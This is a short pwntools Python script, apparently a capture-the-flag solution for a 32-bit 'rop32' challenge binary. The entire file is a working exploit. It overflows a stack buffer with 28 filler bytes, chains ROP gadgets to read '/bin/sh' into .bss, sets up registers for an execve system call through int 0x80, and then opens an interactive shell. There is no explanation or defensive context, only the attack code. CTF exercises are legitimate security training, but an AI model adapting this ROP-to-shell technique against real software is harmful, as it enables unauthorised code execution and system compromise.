from pwn import *

context.arch = 'i386'

con = process('/problems/rop32_1_c4f09c419e5910665553c0237de93dcf/vuln')
con.recvline()

bss = 0x080db320 + 0x100
pop_eax = 0x0805c524
pop_ebx = 0x080481c9
pop_edx = 0x0806ee6b
pop_ecx_pop_ebx = 0x0806ee92
int80 = 0x08049563

payload = 'A' * 28

payload += pack(0x8050120)  # gets
payload += pack(pop_ebx)
payload += pack(bss)

payload += pack(pop_ecx_pop_ebx)
payload += pack(0x00)
payload += pack(bss)

payload += pack(pop_edx)
payload += pack(0x00)

payload += pack(pop_eax)
payload += pack(0xb)

payload += pack(int80)
con.sendline(payload)

con.sendline('/bin/sh')

con.interactive()
